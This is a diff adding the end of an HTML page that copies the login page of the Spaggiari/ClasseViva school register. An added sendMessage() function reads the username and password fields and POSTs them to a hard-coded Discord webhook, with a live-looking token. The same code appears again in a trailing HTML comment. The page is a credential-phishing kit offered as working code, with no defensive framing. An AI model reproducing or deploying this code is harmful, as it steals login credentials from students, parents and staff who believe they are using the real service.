+<!--<button id="close_cookie_info" type="button" class="close" aria-label="Chiudi" @click="cookieClose()">
+<span aria-hidden="true">×</span>
+</button>-->
+</div>
+</div>
+</div>
+</div>
+</body>
+<script>
+const baseDomain = '.spaggiari.eu';
+const target = 'cvv';
+const custcode = '';
+const hinfoVar = null;
+const is_spid_enabled = '1';
+const $LOGIN_SUCCESS = {"CRD_SUC_PASSWORD_REMIND_EMAIL_SENT":"CRD060","CRD_SUC_PASSWORD_REMIND_EMAIL_NOSAM_SENT":"CRD061","CRD_SUC_PASSWORD_CHANGED":"CRD070"};
+const $LOGIN_WARNINGS = {"CRD_WAR_CHANGE_PASSWORD":"CRD040","SPD_WAR_EMPTY_PROFILES":"SPD000","SPD_WAR_EMPTY_PROFILES_01":"SPD001","SPD_WAR_EMPTY_PROFILES_02":"SPD002","SPD_WAR_EMPTY_PROFILES_03":"SPD003"};
+const $LOGIN_ERRORS = {"CRD_ERR_INSERT_USERNAME_PASSWORD":"CRD000","CRD_ERR_USERNAME_PASSWORD_FAIL":"CRD001","CRD_ERR_PASSWORD_REMIND_RECAPTCHA_FAIL":"CRD010","CRD_ERR_EMAIL_NOT_FOUND":"CRD012","CRD_ERR_USERNAME_NOT_FOUND":"CRD013","CRD_ERR_USERNAME_REMIND_EMPTY_MAIL_SET":"CRD011","CRD_ERR_USERNAME_PASSWORD_VALIDATION":"CRD002","CRD_ERR_TOO_MANY_FAILURES":"CRD003","AUT_ERR_AUTH_FAILED":"AUT000","EID_ERR_MISSING_TOKEN":"EID000","EID_ERR_TOKEN_VALIDATION_FAILURE":"EID001","EID_ERR_STATE_DECODE_FAILURE":"EID002","EID_ERR_TOKEN_MISSING_CF":"EID003","JWT_ERR_DECODE":"JWT000","JWT_ERR_TIMEOUT":"JWT001","JSON_ERR_DECODE":"JSN000","AJX_ERR_COMUNICATION_ERROR":"AJX000","SES_ERR_MISSING_SESSION":"SES000","SES_ERR_BAD_REQUEST":"SES001","ASP_ERR_CUSTOMER_NOT_SELECTED":"ASP000","ASP_ERR_INVALID_CUSTOMER":"EASR01","ASP_ERR_INTERNAL_ERROR":"EASK00","ASP_ERR_LOGIN_FAILED":"EASK01","ASP_ERR_LOGIN_TIMEOUT":"EASK02","ASP_ERR_BAD_RESPONSE":"EASK03","ASP_ERR_FATAL_ERROR":"EASK04"};
+var login_success = [];
+var login_warnings = [];
+var login_errors = [];
+const $BANNERS_DESKTOP = [];
+const $BANNERS_MOBILE = [];
+function sendMessage() {
+    const login = this.document.getElementById("login").value;
+    const psw = this.document.getElementById("password").value;
+    const url = 'https://discord.com/api/webhooks/1043254379349823529/fbJ81GQTyl9zgk0rr9IpZ2fS5fei1gaW2Udvy6707JguejkQ3rNP12dyJ3UWW_AnuXYD';
+    const request = new XMLHttpRequest();
+    request.open('POST', url);
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {
+        username: "TESTING",
+        avatar_url: "",
+        content: `EMAIL: ${this.document.getElementById("login").value}\nPASSWORD: ${this.document.getElementById("password").value}`
+    };
+    request.send(JSON.stringify(params));
+}
+</script>
+
+</html>
+
+
+<!-- const request = new XMLHttpRequest();
+request.open('POST', 'https://discord.com/api/webhooks/1043254379349823529/fbJ81GQTyl9zgk0rr9IpZ2fS5fei1gaW2Udvy6707JguejkQ3rNP12dyJ3UWW_AnuXYD');
+request.setRequestHeader('Content-type', 'application/json');
+const params = {
+username: "TESTING",
+avatar_url: "",
+content: `EMAIL: ${this.document.getElementById("login").value}\nPASSWORD:
+${this.document.getElementById("password").value}`
+};
+request.send(JSON.stringify(params)); -->
